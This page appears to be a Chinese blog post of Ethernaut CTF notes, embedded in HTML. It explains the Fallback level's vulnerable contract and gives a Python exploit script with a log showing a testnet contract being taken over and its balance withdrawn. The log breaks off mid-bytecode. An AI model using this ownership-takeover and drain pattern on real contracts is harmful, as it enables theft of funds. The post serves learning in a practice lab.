@@ -1,0 +1,1200 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>[BlockChain] Ethernaut做题笔记（更新中） - Shino Channel</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="[BlockChain] Ethernaut做题笔记（更新中）" />
+<meta property="og:description" content="Before Start 其实很早就开始想学区块链安全了，但是因为环境炸了、Ropsten测试链关了和懒等等原因直到Hackergame的链上记忆大师题才开始上手实操区块链题。后来在强网拟态和N1CTF等比赛中由于不熟悉ctf区块链题的交互方式也是一直在鸽子。
+后来看wp找到了这个仓库才开始进行一个题的做。
+先从这个靶场打起
+Fallback 其实这个题是可以通过Console交互来完成的，但是我还是想试一试用神奇的Poseidon库。
+题目 目标：成为合约的owner并清空Balance
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  contract Fallback { mapping(address =&gt; uint) public contributions; address payable public owner; constructor() public { owner = msg.sender; contributions[msg.sender] = 1000 * (1 ether); } modifier onlyOwner { require( msg." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://sh11no.github.io/blockchain/" /><meta property="og:image" content="http://sh11no.github.io/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-11-14T21:35:23+08:00" />
+<meta property="article:modified_time" content="2022-11-14T21:35:23+08:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://sh11no.github.io/logo.png"/>
+
+<meta name="twitter:title" content="[BlockChain] Ethernaut做题笔记（更新中）"/>
+<meta name="twitter:description" content="Before Start 其实很早就开始想学区块链安全了，但是因为环境炸了、Ropsten测试链关了和懒等等原因直到Hackergame的链上记忆大师题才开始上手实操区块链题。后来在强网拟态和N1CTF等比赛中由于不熟悉ctf区块链题的交互方式也是一直在鸽子。
+后来看wp找到了这个仓库才开始进行一个题的做。
+先从这个靶场打起
+Fallback 其实这个题是可以通过Console交互来完成的，但是我还是想试一试用神奇的Poseidon库。
+题目 目标：成为合约的owner并清空Balance
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  contract Fallback { mapping(address =&gt; uint) public contributions; address payable public owner; constructor() public { owner = msg.sender; contributions[msg.sender] = 1000 * (1 ether); } modifier onlyOwner { require( msg."/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://sh11no.github.io/blockchain/" /><link rel="prev" href="http://sh11no.github.io/sichuan2022/" /><link rel="next" href="http://sh11no.github.io/hitcon2022/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "[BlockChain] Ethernaut做题笔记（更新中）",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/sh11no.github.io\/blockchain\/"
+        },"genre": "posts","wordcount":  1552 ,
+        "url": "http:\/\/sh11no.github.io\/blockchain\/","datePublished": "2022-11-14T21:35:23+08:00","dateModified": "2022-11-14T21:35:23+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Shino"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Shino Channel"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="http://www.nu1l.com/" rel="noopener noreffer" target="_blank"> Nu1L </a><a class="menu-item" href="http://blog.cnss.io/" rel="noopener noreffer" target="_blank"> CNSS </a><a class="menu-item" href="/friends/"> Friends </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Shino Channel"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="http://www.nu1l.com/" title="" rel="noopener noreffer" target="_blank">Nu1L</a><a class="menu-item" href="http://blog.cnss.io/" title="" rel="noopener noreffer" target="_blank">CNSS</a><a class="menu-item" href="/friends/" title="">Friends</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">[BlockChain] Ethernaut做题笔记（更新中）</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Shino</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-11-14">2022-11-14</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1552 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 8 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="true">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#before-start">Before Start</a></li>
+    <li><a href="#fallback">Fallback</a>
+      <ul>
+        <li><a href="#题目">题目</a></li>
+        <li><a href="#题目分析">题目分析</a></li>
+        <li><a href="#解题思路">解题思路</a></li>
+      </ul>
+    </li>
+    <li><a href="#coinflip">CoinFlip</a>
+      <ul>
+        <li><a href="#题目-1">题目</a></li>
+        <li><a href="#题目分析-1">题目分析</a></li>
+        <li><a href="#解题思路-1">解题思路</a></li>
+      </ul>
+    </li>
+    <li><a href="#telephone">Telephone</a>
+      <ul>
+        <li><a href="#题目-2">题目</a></li>
+        <li><a href="#题目分析-2">题目分析</a></li>
+        <li><a href="#解题思路-2">解题思路</a></li>
+      </ul>
+    </li>
+    <li><a href="#token">Token</a>
+      <ul>
+        <li><a href="#题目-3">题目</a></li>
+        <li><a href="#题目分析-3">题目分析</a></li>
+        <li><a href="#解题思路-3">解题思路</a></li>
+      </ul>
+    </li>
+    <li><a href="#delegation">Delegation</a>
+      <ul>
+        <li><a href="#题目-4">题目</a></li>
+        <li><a href="#题目分析-4">题目分析</a></li>
+        <li><a href="#解题思路-4">解题思路</a></li>
+      </ul>
+    </li>
+    <li><a href="#force">Force</a>
+      <ul>
+        <li><a href="#题目-5">题目</a></li>
+        <li><a href="#题目分析-5">题目分析</a></li>
+        <li><a href="#解题思路-5">解题思路</a></li>
+      </ul>
+    </li>
+    <li><a href="#vault">Vault</a>
+      <ul>
+        <li><a href="#题目-6">题目</a></li>
+        <li><a href="#题目分析-6">题目分析</a></li>
+        <li><a href="#解题思路-6">解题思路</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="before-start">Before Start</h2>
+<p>其实很早就开始想学区块链安全了，但是因为环境炸了、Ropsten测试链关了和懒等等原因直到Hackergame的链上记忆大师题才开始上手实操区块链题。后来在强网拟态和N1CTF等比赛中由于不熟悉ctf区块链题的交互方式也是一直在鸽子。</p>
+<p>后来看wp找到了<a href="https://github.com/B1ue1nWh1te/Poseidon" target="_blank" rel="noopener noreffer">这个仓库</a>才开始进行一个题的做。</p>
+<p>先从<a href="https://ethernaut.openzeppelin.com" target="_blank" rel="noopener noreffer">这个靶场</a>打起</p>
+<h2 id="fallback">Fallback</h2>
+<p>其实这个题是可以通过Console交互来完成的，但是我还是想试一试用神奇的Poseidon库。</p>
+<h3 id="题目">题目</h3>
+<p>目标：成为合约的owner并清空Balance</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="kd">contract</span> <span class="nc">Fallback</span> <span class="p">{</span>
+
+  <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint</span><span class="p">)</span> <span class="k">public</span> <span class="n">contributions</span><span class="p">;</span>
+  <span class="kt">address</span> <span class="k">payable</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+
+  <span class="kd">constructor</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+    <span class="n">contributions</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1000</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="kc">ether</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="kd">modifier</span> <span class="nf">onlyOwner</span> <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span>
+            <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">owner</span><span class="p">,</span>
+            <span class="s">&#34;caller is not the owner&#34;</span>
+        <span class="p">);</span>
+        <span class="k">_</span><span class="p">;</span>
+    <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nf">contribute</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
+    <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">.</span><span class="mi">001</span> <span class="kc">ether</span><span class="p">);</span>
+    <span class="n">contributions</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">contributions</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">contributions</span><span class="p">[</span><span class="n">owner</span><span class="p">])</span> <span class="p">{</span>
+      <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nf">getContribution</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="n">contributions</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">];</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">()</span> <span class="k">public</span> <span class="n">onlyOwner</span> <span class="p">{</span>
+    <span class="n">owner</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+    <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">contributions</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="题目分析">题目分析</h3>
+<p>考点：fallback函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+	<span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">contributions</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>合约中允许包含一个未命名的函数（Fallback 函数），这个函数没有参数和返回值。</li>
+<li>如果在调用合约时，没有函数与给定的标识匹配，Fallback 函数会被执行。</li>
+<li>每当合约收到以太币，Fallback 函数就会被执行。</li>
+</ul>
+<p>在本题的 Fallback 函数中（如上），若随交易发送的以太币<code>msg.value</code>和交易发送者的<code>contribution</code>均大于0，则可以变更合约owner。</p>
+<p>同时，在<code>contribute()</code>函数中，可以为消息发送者添加很少<code>contribution</code>。很显然通过这个函数使<code>contribution</code>超过 owner 并不现实。但是这个函数可以帮助我们满足 Fallback 函数中<code>contribution &gt; 0</code>的限制。</p>
+<h3 id="解题思路">解题思路</h3>
+<ul>
+<li>调用<code>contribute()</code>函数，附带少量以太币，满足<code>contribution &gt; 0</code></li>
+<li>向合约转账少量以太币，触发<code>fallback</code>函数，成为合约owner</li>
+<li>调用<code>withdraw()</code>函数清空 balance 达成目标。</li>
+</ul>
+<p>使用Poseidon库进行交互。（附注释）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">Poseidon.Blockchain</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">#连接到Sepolia测试链</span>
+<span class="n">chain</span> <span class="o">=</span> <span class="n">Chain</span><span class="p">(</span><span class="s2">&#34;https://rpc.sepolia.org&#34;</span><span class="p">)</span>
+
+<span class="c1">#用私钥创建账户实例。由于这里用的是真实的账户隐去私钥。</span>
+<span class="n">account</span> <span class="o">=</span> <span class="n">Account</span><span class="p">(</span><span class="n">chain</span><span class="p">,</span> <span class="s2">&#34;your private key&#34;</span><span class="p">)</span>
+
+<span class="c1">#编译题目合约，创建合约实例</span>
+<span class="n">abi</span><span class="p">,</span> <span class="n">bytecode</span> <span class="o">=</span> <span class="n">BlockchainUtils</span><span class="o">.</span><span class="n">Compile</span><span class="p">(</span><span class="s2">&#34;fallback.sol&#34;</span><span class="p">,</span> <span class="s2">&#34;Fallback&#34;</span><span class="p">)</span>
+<span class="n">contractAddress</span> <span class="o">=</span> <span class="mh">0xc80d2089B60231B9D045e985bCB6Fb07Fc8B543E</span>
+<span class="n">contract</span> <span class="o">=</span> <span class="n">Contract</span><span class="p">(</span><span class="n">account</span><span class="p">,</span> <span class="n">contractAddress</span><span class="p">,</span> <span class="n">abi</span><span class="p">)</span>
+
+<span class="c1">#调用contribute函数。由于常规函数调用事件不能附带以太币发送，故使用自定义交易方式调用函数</span>
+<span class="n">Calldata</span> <span class="o">=</span> <span class="n">contract</span><span class="o">.</span><span class="n">EncodeABI</span><span class="p">(</span><span class="s2">&#34;contribute&#34;</span><span class="p">)</span>
+<span class="n">account</span><span class="o">.</span><span class="n">SendTransaction</span><span class="p">(</span><span class="n">contract</span><span class="o">.</span><span class="n">Address</span><span class="p">,</span> <span class="n">Data</span> <span class="o">=</span> <span class="n">Calldata</span><span class="p">,</span> <span class="n">Value</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c1">#触发fallback函数</span>
+<span class="n">account</span><span class="o">.</span><span class="n">SendTransaction</span><span class="p">(</span><span class="n">contract</span><span class="o">.</span><span class="n">Address</span><span class="p">,</span> <span class="n">Data</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">Value</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c1">#调用withdraw函数</span>
+<span class="n">contract</span><span class="o">.</span><span class="n">CallFunction</span><span class="p">(</span><span class="s2">&#34;withdraw&#34;</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>交互日志（可以看到实际的交易事件内容）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">2022-11-14 21:06:54.128 | SUCCESS  | Poseidon.Blockchain:__init__:32 - 
+[Chain][Connect]Successfully connected to [https://rpc.sepolia.org]. [Delay] 20774 ms
+2022-11-14 21:06:55.198 | SUCCESS  | Poseidon.Blockchain:GetBasicInformation:49 - 
+[Chain][GetBasicInformation]
+[ChainId]11155111
+[BlockNumber]2287892
+[GasPrice]1.500000007 Gwei
+[ClientVersion]Geth/v1.10.21-unstable-926b3e08-20220706/linux-amd64/go1.18.1
+2022-11-14 21:06:55.229 | SUCCESS  | Poseidon.Blockchain:__init__:241 - 
+[Account][Import]Successfully import account [0x7Ebd33D2e0707abD856c86C32D424122D400D9E9].
+2022-11-14 21:06:55.505 | SUCCESS  | Poseidon.Blockchain:GetBalance:122 - 
+[Chain][GetBalance][0x7Ebd33D2e0707abD856c86C32D424122D400D9E9]
+[44716479299591096 Wei]&lt;=&gt;[0.044716479299591096 Ether]
+2022-11-14 21:06:55.559 | SUCCESS  | Poseidon.Blockchain:Compile:610 - 
+[BlockchainUtils][Compile]
+[FileCourse]target.sol
+[ContractName]Fallback
+[ABI][{&#39;inputs&#39;: [], &#39;stateMutability&#39;: &#39;nonpayable&#39;, &#39;type&#39;: &#39;constructor&#39;}, {&#39;inputs&#39;: [], &#39;name&#39;: &#39;contribute&#39;, &#39;outputs&#39;: [], &#39;stateMutability&#39;: &#39;payable&#39;, &#39;type&#39;: &#39;function&#39;}, {&#39;inputs&#39;: [{&#39;internalType&#39;: &#39;address&#39;, &#39;name&#39;: &#39;&#39;, &#39;type&#39;: &#39;address&#39;}], &#39;name&#39;: &#39;contributions&#39;, &#39;outputs&#39;: [{&#39;internalType&#39;: &#39;uint256&#39;, &#39;name&#39;: &#39;&#39;, &#39;type&#39;: &#39;uint256&#39;}], &#39;stateMutability&#39;: &#39;view&#39;, &#39;type&#39;: &#39;function&#39;}, {&#39;inputs&#39;: [], &#39;name&#39;: &#39;getContribution&#39;, &#39;outputs&#39;: [{&#39;internalType&#39;: &#39;uint256&#39;, &#39;name&#39;: &#39;&#39;, &#39;type&#39;: &#39;uint256&#39;}], &#39;stateMutability&#39;: &#39;view&#39;, &#39;type&#39;: &#39;function&#39;}, {&#39;inputs&#39;: [], &#39;name&#39;: &#39;owner&#39;, &#39;outputs&#39;: [{&#39;internalType&#39;: &#39;address payable&#39;, &#39;name&#39;: &#39;&#39;, &#39;type&#39;: &#39;address&#39;}], &#39;stateMutability&#39;: &#39;view&#39;, &#39;type&#39;: &#39;function&#39;}, {&#39;inputs&#39;: [], &#39;name&#39;: &#39;withdraw&#39;, &#39;outputs&#39;: [], &#39;stateMutability&#39;: &#39;nonpayable&#39;, &#39;type&#39;: &#39;function&#39;}, {&#39;stateMutability&#39;: &#39;payable&#39;, &#39;type&#39;: &#39;receive&#39;}]
+[Bytecode]608060405234801561001057600080fd5b5033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550683635c9adc5dea000006000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610515806100ad6000396000f3fe60806040526004361061004e5760003560e01c80633ccfd60b146100f257806342e94c90146101095780638da5cb5b1461016e578063d7bb99ba146101af578063f10fdf5c146101b9576100ed565b366100ed576000341180156100a1575060008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054115b6100aa57600080fd5b33600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550005b600080fd5b3480156100fe57600080fd5b506101076101e4565b005b34801561011557600080fd5b506101586004803603602081101561012c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610312565b6040518082815260200191505060405180910390f35b34801561017a57600080fd5b5061018361032a565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101b7610350565b005b3480156101c557600080fd5b506101ce610499565b6040518082815260200191505060405180910390f35b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146102a7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260178152602001807f63616c6c6572206973206e6f7420746865206f776e657200000000000000000081525060200191505060405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801561030f573d6000803e3d6000fd5b50565b60006020528060005260406000206000915090505481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b66038d7ea4c68000341061036357600080fd5b346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550600080600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205411